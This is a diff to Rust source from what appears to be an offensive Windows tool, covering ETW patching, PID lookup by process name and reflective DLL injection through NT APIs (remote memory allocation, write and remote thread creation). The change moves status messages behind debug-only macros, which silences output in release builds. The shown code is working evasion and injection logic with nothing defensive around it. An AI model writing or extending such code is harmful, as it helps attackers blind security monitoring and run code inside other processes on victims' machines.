@@ -6,6 +6,7 @@ use std::ptr::addr_of_mut;
 use anyhow::Ok;
 
 use crate::nt_api::*;
+use crate::{debug_eprintln, debug_println};
 use crate::parse_pe::PeModuleParser;
 use crate::parse_pe::get_module_handle;
 
@@ -82,9 +83,9 @@ pub fn patch_etw() -> Result<(), anyhow::Error>
     };
 
     if res != STATUS_SUCCESS || bytes_written != size {
-        eprintln!("[ERROR] Failed to patch ETW: 0x{:X}.", res);
+        debug_eprintln!("[ERROR] Failed to patch ETW: 0x{:X}.", res);
     } else {
-        println!("[INFO] Successfully patched ETW.");
+        debug_println!("[INFO] Successfully patched ETW.");
     }
 
     Ok(())
@@ -100,7 +101,7 @@ pub fn get_process_pid_by_name(target_name_wide: &[u16]) -> Option<u32> {
     unsafe {
         let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         if snapshot == INVALID_HANDLE_VALUE {
-            eprintln!("[ERROR] process snapshot.");
+            debug_eprintln!("[ERROR] process snapshot.");
             return None;
         }
         let mut entry: PROCESSENTRY32W = std::mem::zeroed();
@@ -122,7 +123,7 @@ pub fn get_process_pid_by_name(target_name_wide: &[u16]) -> Option<u32> {
                 }
             }
         } else {
-            eprintln!("[ERROR] first process.");
+            debug_eprintln!("[ERROR] first process.");
         }
 
         let _ = CloseHandle(snapshot);
@@ -138,7 +139,7 @@ pub fn inject_dll_into_process(target_name_wide: &[u16], rf_dll: &PeFileParser, 
     let pid = get_process_pid_by_name(target_name_wide)
         .ok_or_else( || anyhow::anyhow!("[ERROR] Process not found.") )?;
 
-    println!("[INFO] Found pid: {}.", pid);
+    debug_println!("[INFO] Found pid: {}.", pid);
 
 
     unsafe 
@@ -200,7 +201,7 @@ pub fn inject_dll_into_process(target_name_wide: &[u16], rf_dll: &PeFileParser, 
             return Err(anyhow::anyhow!("[ERROR] Failed to allocate memory in target process: 0x{:X}.", status));
         }
 
-        println!("[INFO] Allocated remote memory at address: 0x{:X}.", base_address as usize);
+        debug_println!("[INFO] Allocated remote memory at address: 0x{:X}.", base_address as usize);
 
 
         let mut bytes_written: SIZE_T = 0;
@@ -220,6 +221,8 @@ pub fn inject_dll_into_process(target_name_wide: &[u16], rf_dll: &PeFileParser, 
             NtClose(process_handle);
             return Err(anyhow::anyhow!("[ERROR] Failed to write DLL data to target process: 0x{:X}.", status));
         }
+
+        debug_println!("[INFO] Written {} bytes to remote process.", bytes_written);
 
         let mut thread_handle: HANDLE = null_mut();
         let start_address = (base_address as usize + yolo) as *mut std::ffi::c_void;
@@ -247,6 +250,8 @@ pub fn inject_dll_into_process(target_name_wide: &[u16], rf_dll: &PeFileParser, 
             NtClose(process_handle);
             return Err(anyhow::anyhow!("[ERROR] Failed to create remote thread: 0x{:X}.", status));
         }
+
+        debug_println!("[INFO] Remote thread created successfully.");
 
         NtClose(thread_handle);
         NtClose(process_handle);
